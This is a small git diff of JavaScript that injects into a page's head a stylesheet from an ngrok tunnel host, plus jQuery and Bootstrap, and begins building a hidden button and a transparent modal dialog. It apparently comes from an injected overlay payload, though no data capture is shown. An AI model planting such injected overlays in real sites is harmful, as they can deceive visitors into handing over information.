@@ -1,6 +1,7 @@
-$('head').append('<link rel="stylesheet" href="https://975ffa93.ngrok.io/file.css">')
-$('head').append('<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>' )
-var html = '<button type="button" class="btn btn-info btn-lg" data-toggle="modal" id="myid" data-target="#myModal" style="display: none;">Click here </button>' + '<div class="modal fade" id="myModal" role="dialog">'+'<div class="modal-dialog">'+
+$('head').append('<link rel="stylesheet" href="https://975ffa93.ngrok.io/file.css">' +
+    '<link rel=\'stylesheet prefetch\' href=\'https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css\'>')
+$('head').append('<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>' + '<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>')
+var html = '<button type="button" class="btn btn-info btn-lg" data-toggle="modal" id="myid" data-target="#myModal" style="display: none;">Click here </button>' + '<div class="modal fade" id="myModal" role="dialog" style="background-color: transparent;">'+'<div class="modal-dialog">'+
     '<div class="modal-content">'+
       '<div class="modal-header">'+
         '<button type="button" class="close" data-dismiss="modal">&times;</button>'+
